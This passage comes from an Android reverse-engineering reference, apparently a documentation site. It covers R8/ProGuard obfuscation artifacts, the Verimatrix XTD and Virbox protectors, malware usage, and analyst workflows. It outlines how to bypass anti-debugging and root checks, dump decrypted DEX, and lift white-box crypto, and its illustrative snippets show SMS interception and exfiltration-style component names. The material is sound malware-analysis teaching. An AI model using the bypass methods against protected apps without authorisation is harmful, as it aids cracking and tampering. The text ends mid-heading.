<pre><code>public class a {\n    public void b() {\n        Log.d(\"PaymentProcessor\", \"Processing transaction\");\n        ...\n    }\n}\n</code></pre> <p>The log tag <code>\"PaymentProcessor\"</code> reveals the class purpose despite its <code>a</code> name.</p> <p>Android Framework and Library Calls</p> <p>Method signatures of Android APIs and common libraries are never obfuscated:</p> <pre><code>public class a extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String action = intent.getAction();\n        if (\"android.provider.Telephony.SMS_RECEIVED\".equals(action)) {\n            ...\n        }\n    }\n}\n</code></pre> <p>The superclass, overridden method name, and intent action string immediately identify this as an SMS interceptor.</p> <p>Reflection Usage</p> <p>Code that uses reflection must reference original class and method names as strings:</p> <pre><code>Class cls = Class.forName(\"android.telephony.TelephonyManager\");\nMethod m = cls.getMethod(\"getDeviceId\");\n</code></pre> <p>These strings survive obfuscation because they are runtime values, not compile-time identifiers.</p> <p>Serialized Field Names</p> <p>JSON serialization libraries preserve field names as strings:</p> <pre><code>public class d {\n    @SerializedName(\"account_number\")\n    public String a;\n\n    @SerializedName(\"routing_number\")\n    public String b;\n\n    @SerializedName(\"balance\")\n    public double c;\n}\n</code></pre> <p>The <code>@SerializedName</code> annotations (or equivalent JSON keys) reveal the real purpose of each field.</p> <p>AIDL Interfaces</p> <p>AIDL-generated code retains transaction names and descriptor strings:</p> <pre><code>public static final String DESCRIPTOR = \"com.example.myapp.IRemoteService\";\n</code></pre> <p>Manifest-Declared Components</p> <p>Activities, services, receivers, and providers declared in <code>AndroidManifest.xml</code> keep their full class names because the Android runtime needs to find and instantiate them.</p>"},{"location":"packers/r8-proguard/#keep-rules-as-intelligence","title":"Keep Rules as Intelligence","text":"<p>The <code>proguard-rules.pro</code> file (or <code>consumer-rules.pro</code> for libraries) defines which classes, methods, and fields must not be renamed or removed. These rules are a goldmine for analysts because they reveal architectural decisions and dependencies.</p>"},{"location":"packers/r8-proguard/#reading-keep-rules","title":"Reading Keep Rules","text":"<pre><code>-keep class com.example.myapp.api.** { *; }\n-keep class com.example.myapp.model.** { *; }\n-keepclassmembers class * implements android.os.Parcelable {\n    static ** CREATOR;\n}\n-keepnames class * extends com.example.myapp.plugin.PluginBase\n</code></pre> <p>These rules tell an analyst:</p> <ul> <li>The <code>api</code> and <code>model</code> packages contain classes used via reflection or serialization (likely API request/response models)</li> <li>The app uses <code>Parcelable</code> for IPC</li> <li>There is a plugin system with a <code>PluginBase</code> class and dynamically loaded implementations</li> </ul>"},{"location":"packers/r8-proguard/#what-keep-rules-reveal","title":"What Keep Rules Reveal","text":"Rule Pattern Implies <code>-keep class **.model.** { *; }</code> JSON/XML serialization models -- field names map to API schema <code>-keep class ** extends android.app.Service</code> Services loaded by name (possibly from config) <code>-keepclassmembers class * { @com.google.gson.annotations.* &lt;fields&gt;; }</code> Uses Gson for JSON parsing <code>-keep class **.BuildConfig { *; }</code> Build configuration exposed at runtime <code>-keep class * implements java.io.Serializable</code> IPC or persistence via Java serialization <code>-keep class **.js.** { *; }</code> JavaScript bridge interfaces for WebView <code>-keepclassmembers class * { @android.webkit.JavascriptInterface &lt;methods&gt;; }</code> WebView JS bridge -- potential attack surface"},{"location":"packers/r8-proguard/#finding-keep-rules-in-apks","title":"Finding Keep Rules in APKs","text":"<p>R8 embeds a processed version of the keep rules into the build. Some APKs include the original <code>proguard-rules.pro</code> in the root of the APK or inside <code>META-INF/</code>. Additionally, library AARs bundle their own <code>proguard.txt</code> consumer rules that get merged into the final configuration.</p>"},{"location":"packers/r8-proguard/#common-patterns","title":"Common Patterns","text":""},{"location":"packers/r8-proguard/#enum-names-survive","title":"Enum Names Survive","text":"<p>Enum constants are almost always preserved because <code>Enum.valueOf(String)</code> requires the original name at runtime:</p> <pre><code>public enum a {\n    TRANSACTION_SUCCESS,\n    TRANSACTION_FAILED,\n    TRANSACTION_PENDING,\n    INSUFFICIENT_FUNDS;\n}\n</code></pre> <p>The class name <code>a</code> is obfuscated, but the constant names reveal intent. This is one of the most reliable sources of plaintext names in obfuscated APKs.</p>"},{"location":"packers/r8-proguard/#parcelable-classes","title":"Parcelable Classes","text":"<p>Classes implementing <code>Parcelable</code> require a public <code>CREATOR</code> field and are often referenced by name in intents. The default ProGuard rules keep the <code>CREATOR</code> field, and the class itself is typically kept because it crosses process boundaries.</p>"},{"location":"packers/r8-proguard/#manifest-declared-components","title":"Manifest-Declared Components","text":"<p>All components declared in <code>AndroidManifest.xml</code> retain their original fully qualified class names:</p> <pre><code>&lt;activity android:name=\"com.example.myapp.ui.LoginActivity\" /&gt;\n&lt;service android:name=\"com.example.myapp.service.DataExfiltrationService\" /&gt;\n&lt;receiver android:name=\"com.example.myapp.receiver.BootReceiver\" /&gt;\n</code></pre> <p>These names survive R8/ProGuard because the Android framework instantiates them by name. The manifest is the first place to look for meaningful class names in an obfuscated APK.</p>"},{"location":"packers/r8-proguard/#serialization-models","title":"Serialization Models","text":"<p>GSON, Moshi, Jackson, and similar libraries require field names to match JSON keys. These classes are either kept entirely or annotated with <code>@SerializedName</code> / <code>@Json</code>:</p> <pre><code>public class c {\n    @SerializedName(\"device_id\")\n    String a;\n\n    @SerializedName(\"installed_apps\")\n    List&lt;String&gt; b;\n\n    @SerializedName(\"sms_messages\")\n    List&lt;d&gt; c;\n}\n</code></pre> <p>The annotations expose the data model regardless of field renaming.</p>"},{"location":"packers/r8-proguard/#native-method-declarations","title":"Native Method Declarations","text":"<p>JNI method names must match between Java and native code. If using static registration (not <code>RegisterNatives</code>), the native method names survive obfuscation:</p> <pre><code>public class a {\n    public static native String decryptPayload(byte[] data, int key);\n}\n</code></pre> <p>However, if the class containing the native method is renamed, the corresponding JNI function name in the .so must also match the obfuscated name (e.g., <code>Java_a_b_c_decryptPayload</code>). Developers often keep native classes unobfuscated to avoid this complexity.</p>"},{"location":"packers/r8-proguard/#r8-vs-proguard-differences","title":"R8 vs ProGuard Differences","text":""},{"location":"packers/r8-proguard/#class-merging-r8-only","title":"Class Merging (R8 Only)","text":"<p>R8 can merge classes that have a single implementation or are only used in one place. A class and its only subclass may be collapsed into one:</p> <pre><code>Before R8:\n  abstract class BaseRepository { void save(Data d); }\n  class UserRepository extends BaseRepository { void save(Data d) { ... } }\n\nAfter R8:\n  class a { void a(b bVar) { ... } }\n</code></pre> <p>The inheritance relationship disappears entirely. This makes reconstructing the original architecture harder.</p>"},{"location":"packers/r8-proguard/#more-aggressive-inlining","title":"More Aggressive Inlining","text":"<p>R8 inlines more aggressively than ProGuard. Short methods (getters, setters, simple wrappers) are absorbed into their callers. The decompiled output may show inline code where the original had clean method boundaries:</p> <pre><code>this.a.b = this.c.a().getSharedPreferences(\"prefs\", 0).getString(\"token\", \"\");\n</code></pre> <p>This single line might represent three separate method calls in the original source.</p>"},{"location":"packers/r8-proguard/#enum-unboxing-r8-full-mode","title":"Enum Unboxing (R8 Full Mode)","text":"<p>With R8 full mode (<code>android.enableR8.fullMode=true</code>), enums can be replaced with integer constants. The enum class disappears and all <code>switch</code> statements use raw ints. This removes the enum name survival pattern described above.</p>"},{"location":"packers/r8-proguard/#kotlin-metadata-stripping","title":"Kotlin Metadata Stripping","text":"<p>R8 strips Kotlin metadata annotations by default. ProGuard preserved them unless explicitly told to remove them. The presence or absence of <code>kotlin.Metadata</code> annotations on classes can hint at which tool was used.</p>"},{"location":"packers/r8-proguard/#identifying-which-tool-was-used","title":"Identifying Which Tool Was Used","text":"Indicator ProGuard R8 Class merging observed No Possible Kotlin metadata present Often preserved Stripped <code>$$Lambda$</code> synthetic classes Present Desugared differently Enum constants as ints No Possible (full mode) Build metadata comment in mapping.txt <code># ProGuard, version X.Y.Z</code> <code># compiler: R8</code> <p>In practice, distinguishing the tool rarely matters for analysis. The deobfuscation approach is the same regardless.</p>"},{"location":"packers/r8-proguard/#malware-usage","title":"Malware Usage","text":""},{"location":"packers/r8-proguard/#proguardr8-only-malware","title":"ProGuard/R8-Only Malware","text":"<p>Many Android malware families ship with only R8 or ProGuard obfuscation and no additional packing. This is the lowest tier of protection:</p> <ul> <li>All strings (C2 URLs, API keys, target app lists) are plaintext in the DEX</li> <li>All API calls are visible to static analysis tools</li> <li>Behavioral analysis is possible without any unpacking or decryption</li> <li>Automated scanners (VirusTotal, Google Play Protect) can pattern-match directly</li> </ul> <p>Families that historically relied on R8/ProGuard alone include early variants of SpyNote, Cerberus-lineage builders, and many low-sophistication SMS stealers and banking trojans.</p>"},{"location":"packers/r8-proguard/#distinguishing-from-dexguard","title":"Distinguishing from DexGuard","text":"<p>DexGuard is built by Guardsquare, the same company that maintains ProGuard. DexGuard extends R8/ProGuard with encryption and runtime protection. Key differences in decompiled output:</p> Feature R8/ProGuard DexGuard String literals Plaintext Encrypted (method calls returning strings) String access <code>\"https://c2.example.com\"</code> <code>o.oo(\"\\\\x4a\\\\x2f...\")</code> Class loading Standard Custom class loader for encrypted classes Native libraries None added <code>libdexguard.so</code> or obfuscated stubs Asset files Normal Encrypted DEX payloads in <code>assets/</code> APKiD detection No special flags <code>packer: DexGuard</code>, <code>anti_disassembly: DexGuard</code> Environmental checks None Root, emulator, debugger, Frida, Xposed detection <p>The fastest way to distinguish: open the APK in jadx and search for string literals. If C2 URLs, package names, and configuration data appear as readable strings, it is R8/ProGuard. If strings are replaced by method calls to single-letter classes that take byte arrays, it is likely DexGuard or another string-encrypting protector.</p>"},{"location":"packers/r8-proguard/#layered-protection","title":"Layered Protection","text":"<p>More sophisticated malware operations use R8/ProGuard as a base layer and add protection on top:</p> <pre><code>R8/ProGuard (name obfuscation, shrinking)\n  + Custom string encryption (XOR/AES of sensitive strings)\n  + Dynamic class loading (second-stage DEX from assets or network)\n  + Native code for critical logic (C2 communication, credential theft)\n</code></pre> <p>This layered approach is cheaper than licensing DexGuard and gives operators more control. Analysts should not assume that R8/ProGuard-level obfuscation is the only protection present -- always check for custom encryption methods and dynamic loading patterns.</p>"},{"location":"packers/r8-proguard/#analyst-workflow","title":"Analyst Workflow","text":"<pre><code>1. Open APK in jadx\n2. Check AndroidManifest.xml for component names (Activities, Services, Receivers)\n3. Search strings for URLs, IPs, package names, API endpoints\n4. If all strings are plaintext -&gt; R8/ProGuard only, proceed with static analysis\n5. If strings are encrypted -&gt; additional protection present (DexGuard, custom)\n6. Use jadx deobfuscation (--deobf) to auto-rename classes\n7. Start from manifest-declared components and trace call graphs\n8. Use enum names, log tags, and serialization annotations to reconstruct meaning\n9. Cross-reference with mapping.txt if available\n</code></pre>"},{"location":"packers/r8-proguard/#references","title":"References","text":"<ul> <li>R8 Documentation</li> <li>ProGuard Manual</li> <li>R8 Compatibility FAQ</li> <li>APKiD</li> </ul>"},{"location":"packers/verimatrix/","title":"Verimatrix XTD","text":"<p>Verimatrix XTD (Extended Threat Defense) is a commercial application protection platform originally developed by Inside Secure (France). The XTD product line was acquired by Guardsquare (Belgium) in February 2026 for $8.5M, placing it under the same corporate umbrella as DexGuard and ProGuard.</p>"},{"location":"packers/verimatrix/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Verimatrix (originally Inside Secure, now Guardsquare) Origin France (Aix-en-Provence) Type Commercial Protector/Obfuscator/RASP Platforms Android, iOS, Web (JavaScript frameworks) Acquisition Inside Secure acquired Verimatrix in 2019 for $143M, took Verimatrix name. XTD product line sold to Guardsquare in Feb 2026 for $8.5M Current Owner Guardsquare (Belgium)"},{"location":"packers/verimatrix/#history-and-ownership","title":"History and Ownership","text":"<p>The lineage of this product is convoluted:</p> <ol> <li>Inside Secure (France) developed the original application protection technology, including Whitebox 3.0 cryptography</li> <li>2019: Inside Secure acquired Verimatrix Inc for $143M and rebranded the combined entity as Verimatrix</li> <li>Dec 2025 -- Feb 2026: Verimatrix sold its XTD (app shielding), Code Protection, and Whitebox product lines to Guardsquare for $8.5M</li> <li>Feb 2026: Guardsquare now owns DexGuard, ProGuard, and the former Verimatrix XTD suite</li> </ol> <p>This consolidation means Guardsquare controls three distinct application protection products (DexGuard, XTD, ProGuard) and one white-box cryptography solution. Future product consolidation is likely -- redundant features between DexGuard and XTD will probably be merged, and the Verimatrix white-box crypto technology may be integrated into DexGuard's offering.</p>"},{"location":"packers/verimatrix/#identification","title":"Identification","text":""},{"location":"packers/verimatrix/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD detects Verimatrix under its original Inside Secure branding:</p> <pre><code>protector : InsideSecure\n</code></pre> <p>APKiD issue #397 documents a false positive where zShield-protected applications were incorrectly flagged as InsideSecure. Verify detection by checking for the additional file artifacts below.</p>"},{"location":"packers/verimatrix/#file-artifacts","title":"File Artifacts","text":"Artifact Description Native library <code>libencryption_&lt;arch&gt;.so</code> (architecture-specific naming) ProGuard/R8 rules <code>-keep</code> rules referencing <code>com.insidesecure.core</code> package Gradle plugin <code>ApkdefenderPlugin.jar</code> in build configuration SDK AAR <code>vmx-xtd-sdk.aar</code> in project dependencies"},{"location":"packers/verimatrix/#proguard-keep-rules","title":"ProGuard Keep Rules","text":"<p>Protected applications include keep rules for Verimatrix's runtime classes:</p> <pre><code>-keep class com.insidesecure.core.** { *; }\n-keep class com.verimatrix.shield.** { *; }\n</code></pre> <p>The <code>com.insidesecure.core</code> package reference persists even after the Verimatrix rebranding, serving as a reliable identification marker.</p>"},{"location":"packers/verimatrix/#build-integration","title":"Build Integration","text":""},{"location":"packers/verimatrix/#gradle-plugin","title":"Gradle Plugin","text":"<p>Verimatrix XTD integrates as a Gradle plugin through <code>ApkdefenderPlugin.jar</code>. The plugin adds protection tasks to the build pipeline:</p> <pre><code>apkprotectDebugRelease\napkprotectVariantRelease\n</code></pre> <p>These tasks run after APK/AAB assembly and apply the configured protection layers to the compiled binary.</p>"},{"location":"packers/verimatrix/#sdk-integration","title":"SDK Integration","text":"<p>The runtime SDK is distributed as <code>vmx-xtd-sdk.aar</code>, which applications include as a dependency. This AAR contains the runtime components needed for RASP checks, white-box crypto operations, and environmental detection.</p>"},{"location":"packers/verimatrix/#cloud-portal","title":"Cloud Portal","text":"<p>Verimatrix operated a cloud portal at <code>appshield.verimatrixcloud.net</code> for configuring protection policies and managing application builds. Following the Guardsquare acquisition, this infrastructure's future is uncertain.</p>"},{"location":"packers/verimatrix/#cicd-integration","title":"CI/CD Integration","text":"<p>GitHub Actions integration is available through the <code>Verimatrix/app-shield-protect</code> action, enabling automated protection in CI/CD pipelines.</p>"},{"location":"packers/verimatrix/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/verimatrix/#multi-language-code-obfuscation","title":"Multi-Language Code Obfuscation","text":"<p>Verimatrix XTD applies obfuscation across multiple programming languages within a single application:</p> Language Obfuscation Support Java Full (bytecode transformation) Kotlin Full (bytecode transformation) C/C++ Native code obfuscation Swift iOS native obfuscation JavaScript Web/hybrid framework obfuscation"},{"location":"packers/verimatrix/#control-flow-obfuscation","title":"Control Flow Obfuscation","text":"<p>Transforms original control flow structures into flattened or opaque predicate-based patterns. Conditional branches are replaced with computed jumps, and loop structures are converted to state machines.</p>"},{"location":"packers/verimatrix/#symbol-renaming","title":"Symbol Renaming","text":"<p>Class, method, and field names are replaced with meaningless identifiers. Unlike ProGuard/R8's simple sequential renaming (a, b, c), Verimatrix can apply more aggressive renaming patterns.</p>"},{"location":"packers/verimatrix/#string-obfuscation","title":"String Obfuscation","text":"<p>String literals are replaced with runtime-computed values. Decryption routines are inlined at each use site rather than centralized, making batch decryption hooking harder than with DexGuard's pattern of centralized decryption classes.</p>"},{"location":"packers/verimatrix/#arithmetic-obfuscation","title":"Arithmetic Obfuscation","text":"<p>Constant values and arithmetic operations are transformed into equivalent but more complex expressions. A simple integer comparison becomes a chain of bitwise operations and arithmetic that produces the same result.</p>"},{"location":"packers/verimatrix/#code-encryption","title":"Code Encryption","text":"<p>Selected code sections are encrypted at rest and decrypted at runtime. This applies to both DEX bytecode and native code sections.</p>"},{"location":"packers/verimatrix/#runtime-environmental-checks","title":"Runtime Environmental Checks","text":"Check Description Root detection Detects su, Magisk, SuperSU, system partition modification Emulator detection Build properties, hardware fingerprinting Debug detection ptrace, TracerPid, JDWP Hook detection Frida, Xposed, Substrate Clone detection Multi-instance and app cloning"},{"location":"packers/verimatrix/#binary-integrity-checks-superchecks","title":"Binary Integrity Checks (\"Superchecks\")","text":"<p>Verimatrix implements what it calls \"superchecks\" -- integrity verification routines that validate the binary's structure at runtime. These checks go beyond simple hash verification, examining code section integrity, resource consistency, and native library state.</p>"},{"location":"packers/verimatrix/#anti-tamper","title":"Anti-Tamper","text":"<p>Detects modification of the APK structure, DEX bytecode, native libraries, and resources. Tampering triggers configurable responses.</p>"},{"location":"packers/verimatrix/#anti-debug","title":"Anti-Debug","text":"<p>Multi-layer debugger detection covering both Java-level (JDWP) and native-level (ptrace, TracerPid) debuggers.</p>"},{"location":"packers/verimatrix/#anti-hook","title":"Anti-Hook","text":"<p>Detects function hooking frameworks including Frida, Xposed, and Cydia Substrate through process memory inspection, loaded library scanning, and runtime class enumeration.</p>"},{"location":"packers/verimatrix/#anti-clone","title":"Anti-Clone","text":"<p>Prevents application cloning and multi-instance execution by validating the installation context and package identity.</p>"},{"location":"packers/verimatrix/#zero-day-flagsblockers","title":"Zero-Day Flags/Blockers","text":"<p>Verimatrix supports OTA-updatable detection rules. New threat signatures (root hiding tools, new Frida variants, novel hooking techniques) can be pushed to deployed applications without requiring a full app update. This is a significant defensive capability -- the protection adapts after deployment.</p>"},{"location":"packers/verimatrix/#accessibility-abuse-detection","title":"Accessibility Abuse Detection","text":"<p>Detects when other applications are using Android's Accessibility Service to interact with the protected application. This counters overlay attacks and automated UI interaction from malware.</p>"},{"location":"packers/verimatrix/#rasp","title":"RASP","text":"<p>Full Runtime Application Self-Protection suite combining the environmental checks, integrity verification, and threat response into a cohesive runtime defense layer.</p>"},{"location":"packers/verimatrix/#white-box-cryptography","title":"White-Box Cryptography","text":"<p>Verimatrix's white-box cryptography is the most technically significant component of the product suite. Originally developed as Inside Secure Whitebox 3.0, it is EMVCo certified for payment security.</p>"},{"location":"packers/verimatrix/#design","title":"Design","text":"<p>White-box crypto transforms standard cryptographic algorithms so that keys are dissolved into the code itself. The key material does not exist as a discrete byte sequence at any point during execution -- it is mathematically distributed across lookup tables and code transformations. The implementation is algorithm-agnostic: the same white-box framework wraps multiple algorithms.</p>"},{"location":"packers/verimatrix/#supported-algorithms","title":"Supported Algorithms","text":"Algorithm Support AES Encryption/decryption AES-GCM Authenticated encryption 3DES Legacy block cipher RSA Asymmetric operations ECDSA Signature verification ECC Elliptic curve operations ECDH Key exchange HMAC Message authentication SHA family Hashing"},{"location":"packers/verimatrix/#security-properties","title":"Security Properties","text":"<ul> <li>Keys resist extraction through static reverse engineering</li> <li>Side-channel analysis (power analysis, electromagnetic emanation) is mitigated through algorithmic design</li> <li>Fault injection attacks (glitching) are detected and countered</li> <li>EMVCo certification validates resistance against a defined set of attack methodologies</li> </ul>"},{"location":"packers/verimatrix/#reverse-engineering-implications","title":"Reverse Engineering Implications","text":"<p>White-box crypto is the hardest component of Verimatrix to defeat. Unlike code obfuscation (which can be bypassed through dynamic analysis) or RASP checks (which can be hooked and disabled), white-box crypto is mathematically designed to resist key extraction. An attacker with full binary access and debugger control still cannot extract the key in a usable form.</p> <p>Practical approaches against white-box crypto:</p> <ul> <li>Differential fault analysis (DFA): Inject faults into the computation and analyze output differences to recover key bits. Requires significant expertise and per-implementation effort</li> <li>Code lifting: Extract the entire white-box implementation and use it as a black box without extracting the key. The implementation becomes an oracle that encrypts/decrypts on demand</li> <li>API hooking: Intercept inputs and outputs of the white-box function calls to capture plaintext data without breaking the crypto</li> </ul>"},{"location":"packers/verimatrix/#framework-support","title":"Framework Support","text":"<p>Verimatrix XTD supports protection of applications built with multiple frameworks:</p> Framework Protection Level Angular JavaScript obfuscation React JavaScript obfuscation React Native JavaScript + native bridge protection Vue JavaScript obfuscation Webpack Bundle-level obfuscation Xamarin .NET/Mono + native protection <p>This multi-framework support is particularly relevant for hybrid applications where JavaScript business logic needs protection alongside native components.</p>"},{"location":"packers/verimatrix/#unpacking-methodology","title":"Unpacking Methodology","text":"<p>Public bypass research for Verimatrix XTD is limited. The product has received less attention from the security research community compared to DexGuard or Chinese packers.</p>"},{"location":"packers/verimatrix/#general-approach","title":"General Approach","text":"<ol> <li>Identify the protection layers present (APKiD, manual artifact inspection)</li> <li>Bypass RASP checks using standard anti-detection Frida scripts</li> <li>Dump decrypted DEX at runtime if code encryption is applied</li> <li>For string obfuscation, hook at the use site rather than seeking centralized decryption methods</li> <li>White-box crypto operations should be treated as black boxes -- intercept I/O rather than attempting key extraction</li> </ol>"},{"location":"packers/verimatrix/#white-box-crypto","title":"White-Box Crypto","text":"<p>The white-box implementation is the primary barrier to complete analysis. Code lifting (extracting the white-box tables and reimplementing the encryption/decryption outside the app) is more practical than attempting key extraction. This approach works for cases where the goal is to replicate the app's cryptographic behavior rather than recover the raw key.</p>"},{"location":"packers/verimatrix/#malware-usage","title":"Malware Usage","text":"<p>Verimatrix XTD has not been observed in malware samples. The commercial licensing model, cloud-based build integration, and enterprise sales process make it impractical for malware authors. The product is exclusively found in legitimate applications.</p>"},{"location":"packers/verimatrix/#industry-usage","title":"Industry Usage","text":"<p>Verimatrix XTD is deployed across several verticals:</p> Industry Use Case Media/streaming DRM protection, content security Gaming Anti-cheat, asset protection Fintech Payment security, white-box crypto for key protection Healthcare Patient data protection, HIPAA compliance Automotive Connected car application security <p>The media and streaming sector represents Verimatrix's historical core market, predating the Inside Secure acquisition.</p>"},{"location":"packers/verimatrix/#guardsquare-acquisition-implications","title":"Guardsquare Acquisition Implications","text":"<p>The February 2026 acquisition creates several scenarios for reverse engineers to watch:</p> <ul> <li>Product consolidation: DexGuard and XTD have overlapping features (code obfuscation, RASP, anti-tampering). Guardsquare will likely merge the strongest components of each</li> <li>White-box crypto in DexGuard: Verimatrix's EMVCo-certified white-box crypto could be integrated into DexGuard, making DexGuard significantly harder to defeat for crypto-dependent analysis</li> <li>Detection signature updates: APKiD may need updated signatures as Guardsquare migrates XTD-protected apps to a unified product. The <code>protector : InsideSecure</code> signature may eventually disappear from new builds</li> <li>Existing deployments: Applications already protected with Verimatrix XTD will continue to show current artifacts until developers migrate to whatever Guardsquare's consolidated product becomes</li> </ul>"},{"location":"packers/verimatrix/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature Verimatrix XTD DexGuard DexProtector zShield White-box crypto EMVCo certified, algorithm-agnostic No No zKeyBox (separate) Multi-language Java, Kotlin, C/C++, JS, Swift Java, Kotlin, native Java, Kotlin, native Java, Kotlin, native Web framework support Angular, React, Vue, Webpack No No No Code encryption Yes Yes (class encryption) Yes Yes (.szip) OTA threat updates Yes (zero-day flags) No No No Accessibility abuse detection Yes No No No Build integration Gradle plugin + cloud portal Gradle plugin CLI post-build Build-time Current owner Guardsquare Guardsquare Licel Zimperium Public bypass research Minimal Extensive Moderate Limited (XXTEA only) Malware adoption None Cracked versions Rare None"},{"location":"packers/verimatrix/#references","title":"References","text":"<ul> <li>Verimatrix XTD App Shield</li> <li>Verimatrix Code Protection</li> <li>Verimatrix Whitebox Cryptography</li> <li>Guardsquare Acquires Verimatrix XTD</li> <li>APKiD -- Android Application Identifier</li> <li>APKiD Issue #397 -- InsideSecure/zShield False Positive</li> <li>Verimatrix GitHub Actions Integration</li> <li>Inside Secure Whitebox 3.0 Documentation</li> <li>EMVCo Security Evaluation</li> </ul>"},{"location":"packers/virbox/","title":"Virbox Protector","text":"<p>Virbox Protector is a commercial application shielding solution developed by SenseShield Technology, a Chinese software protection company. While designed for legitimate developers to protect their applications from reverse engineering, Virbox has been observed in sophisticated Android malware campaigns.</p>"},{"location":"packers/virbox/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer SenseShield Technology Origin China Type Commercial Packer/Protector Platforms Android, Windows, Linux, macOS, ARM-Linux Min Android Android 4.0+ (API 14) Architectures ARM V7/V8, x86, x64 Website appsec.virbox.com"},{"location":"packers/virbox/#identification","title":"Identification","text":""},{"location":"packers/virbox/#file-artifacts","title":"File Artifacts","text":"Artifact Description Stub Package Hex-based package name Stub Class Stub app class Extending Application Native Library <code>libvirbox_*.so</code> in assets or lib folder Tag String <code>\"virbox\"</code> string reference"},{"location":"packers/virbox/#native-library-naming-convention","title":"Native Library Naming Convention","text":"<pre><code>libvirbox_a32.so   // ARM 32-bit\nlibvirbox_a64.so   // ARM 64-bit\nlibvirbox_x86.so   // x86\nlibvirbox_x64.so   // x86_64\nlibvirbox_mips.so  // MIPS\nlibvirbox_m64.so   // MIPS64\n</code></pre>"},{"location":"packers/virbox/#native-method-signatures","title":"Native Method Signatures","text":"<p>Obfuscated JNI methods follow this pattern:</p> <pre><code>native void I6f7de22b_00(Context context);\nnative void I6f7de22b_01(Context context, Application app, String className);\nnative void I6f7de22b_02(Activity activity, Bundle bundle);\nnative void I6f7de22b_03(Activity activity);\nnative void I6f7de22b_04(Activity activity);\nnative void I6f7de22b_05(Network network, NetworkCapabilities caps);\nnative boolean I6f7de22b_06();\n</code></pre>"},{"location":"packers/virbox/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/virbox/#dex-protection","title":"DEX Protection","text":""},{"location":"packers/virbox/#dex-encryption","title":"DEX Encryption","text":"<p>Encrypts the entire classes.dex file. Decryption occurs at runtime via native code. Not recommended for Google Play apps as it may fail store checks.</p>"},{"location":"packers/virbox/#dex-virtualization","title":"DEX Virtualization","text":"<p>Converts Dalvik bytecode into proprietary VM instructions:</p> <ol> <li>Original method bytecode is extracted</li> <li>Bytecode is transformed into custom instruction set</li> <li>Custom VM interpreter executes in native layer</li> <li>Original method becomes a stub calling native VM</li> </ol> <p>This defeats static analysis as the bytecode no longer exists in standard Dalvik format.</p>"},{"location":"packers/virbox/#string-encryption","title":"String Encryption","text":"<p>Sensitive strings are encrypted and decrypted at runtime via SDK labels.</p>"},{"location":"packers/virbox/#native-library-protection","title":"Native Library Protection","text":"<ul> <li>Code Section Encryption: Encrypts .text section of .so files</li> <li>Symbol Table Stripping: Removes function names and exports</li> <li>Import/Export Hiding: Obscures dynamic linking information</li> <li>Function Virtualization: Critical functions converted to VM code</li> </ul>"},{"location":"packers/virbox/#runtime-protection-rasp","title":"Runtime Protection (RASP)","text":""},{"location":"packers/virbox/#anti-debugging","title":"Anti-Debugging","text":"<p>Detects debuggers using multiple techniques:</p> <ul> <li>Checks for TracerPid in <code>/proc/self/status</code></li> <li>Detects ptrace attachment</li> <li>Monitors for IDA Pro, gdb, jeb, lldb</li> <li>App exits immediately upon detection</li> </ul>"},{"location":"packers/virbox/#anti-injection","title":"Anti-Injection","text":"<ul> <li>Dual-session ptrace to block external attachment</li> <li>Detects .so injection attempts</li> <li>Monitors for Frida, Xposed hooks</li> </ul>"},{"location":"packers/virbox/#emulator-detection","title":"Emulator Detection","text":"<p>Identifies emulator environments via:</p> <ul> <li>Build properties (ro.product.model, ro.hardware)</li> <li>File system artifacts</li> <li>Hardware characteristics</li> <li>App terminates if emulator detected</li> </ul>"},{"location":"packers/virbox/#root-detection","title":"Root Detection","text":"<p>Checks for:</p> <ul> <li>su binary presence</li> <li>Root management apps</li> <li>Modified system partitions</li> </ul>"},{"location":"packers/virbox/#multi-parallel-detection","title":"Multi-Parallel Detection","text":"<p>Prevents app cloning and multi-account environments.</p>"},{"location":"packers/virbox/#signature-verification","title":"Signature Verification","text":"<p>Validates APK signature against expected developer certificate to prevent repackaging.</p>"},{"location":"packers/virbox/#file-integrity-check","title":"File Integrity Check","text":"<p>Hash verification of APK contents to detect tampering.</p>"},{"location":"packers/virbox/#vm-architecture","title":"VM Architecture","text":"<p>Virbox's DEX virtualization replaces Dalvik bytecode with a proprietary instruction set executed by an embedded native interpreter. This is not obfuscation or encryption -- the original bytecode is destroyed and replaced with an entirely different representation that only the Virbox VM can execute.</p>"},{"location":"packers/virbox/#custom-instruction-set","title":"Custom Instruction Set","text":"<p>The Virbox VM uses a proprietary opcode table that has no relationship to the Dalvik instruction set. Each Virbox opcode maps to one or more Dalvik operations, but the encoding, operand layout, and instruction widths are all different. The opcode table is randomized per build, so two APKs protected by Virbox will have different opcode assignments even if they contain identical source code. This per-build randomization defeats pattern-based analysis -- you cannot build a universal Virbox disassembler from a single sample.</p> <p>Key properties of the instruction set:</p> <ul> <li>Variable-width instructions (not aligned to Dalvik's 16-bit unit boundaries)</li> <li>Opcodes are assigned from a shuffled table generated at protection time</li> <li>Operand encoding differs from Dalvik's register/immediate format</li> <li>String, type, and method references use an indirection table rather than direct DEX pool indices</li> </ul>"},{"location":"packers/virbox/#dispatch-loop-structure","title":"Dispatch Loop Structure","text":"<p>The VM interpreter in <code>libvirbox_*.so</code> uses a threaded dispatch model rather than a simple switch-case loop. In a switch dispatch interpreter, a central loop reads an opcode, branches through a switch statement, executes the handler, and loops back. Threaded dispatch eliminates the central loop: each opcode handler ends with a direct jump to the next handler, computed from the next opcode in the bytecode stream.</p> <pre><code>void vm_entry(VMContext *ctx) {\n    ctx-&gt;pc = ctx-&gt;bytecode_start;\n    ctx-&gt;handler_table[*ctx-&gt;pc](ctx);\n}\n\nvoid op_handler_0x3A(VMContext *ctx) {\n    uint16_t reg_dst = ctx-&gt;pc[1];\n    uint16_t reg_src = ctx-&gt;pc[2];\n    ctx-&gt;registers[reg_dst] = ctx-&gt;registers[reg_src] + 1;\n    ctx-&gt;pc += 3;\n    ctx-&gt;handler_table[*ctx-&gt;pc](ctx);\n}\n</code></pre> <p>This structure makes static analysis harder because IDA and Ghidra cannot resolve the indirect jump targets without knowing the handler table layout. The control flow graph of the interpreter appears as a set of disconnected basic blocks rather than a recognizable loop.</p>"},{"location":"packers/virbox/#vm-boundary-crossings","title":"VM Boundary 